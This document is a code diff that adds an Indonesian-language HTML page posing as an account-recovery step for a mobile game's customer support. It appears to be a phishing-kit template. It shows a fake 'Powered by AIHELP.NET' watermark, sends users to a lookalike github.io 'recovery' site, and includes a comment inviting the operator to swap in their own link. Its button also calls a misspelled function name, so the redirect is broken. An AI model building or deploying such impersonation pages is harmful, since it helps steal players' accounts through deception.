@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pilih Metode Pemulihan Akun</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: sans-serif; }
+        body { background: #F7F9FA; height: 100vh; display: flex; flex-direction: column; justify-content: space-between; }
+        .header { background: #3B66A4; color: white; text-align: center; padding: 15px; font-size: 14px; position: relative; }
+        .btn-back { position: absolute; left: 15px; color: white; text-decoration: none; font-weight: bold; }
+        .content { flex: 1; padding: 20px 16px; }
+        .title { font-size: 14px; color: #333; margin-bottom: 15px; }
+        .title span { color: red; margin-right: 4px; }
+        .option { background: white; border-radius: 8px; padding: 16px; margin-bottom: 12px; display: flex; justify-content: space-between; align-items: center; font-size: 14px; border: 1px solid #f0f0f0; cursor: pointer; }
+        .option input { width: 18px; height: 18px; accent-color: #1A8CFF; }
+        .footer { padding: 16px; }
+        .btn-next { width: 100%; background: #1A8CFF; color: white; border: none; padding: 14px; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; }
+        .btn-next:active { background: #0073E6; }
+        .wm { text-align: center; font-size: 10px; color: #AAA; margin-top: 15px; }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <a href="#" class="btn-back">&#10094;</a>
+        Pilih Metode Pemulihan Akun
+    </div>
+
+    <div class="content">
+        <div class="title"><span>*</span> Pilih Metode Pemulihan Akun</div>
+
+        <label class="option">
+            <span>Melalui ID Akun</span>
+            <input type="radio" name="metode" value="id" checked>
+        </label>
+
+        <label class="option">
+            <span>Melalui Nama</span>
+            <input type="radio" name="metode" value="nama">
+        </label>
+    </div>
+
+    <div class="footer">
+        <button class="btn-next" onclick="arahkanLink()">Berikutnya</button>
+        <div class="wm">Powered by AIHELP.NET</div>
+    </div>
+
+    <script>
+        function arahanLink() {
+            // SILAHKAN GANTI LINK DI BAWAH INI
+            window.location.href = "https://csmobilelegendsgame.github.io/recovery-2/";
+        }
+    </script>
+
+</body>
+</html>
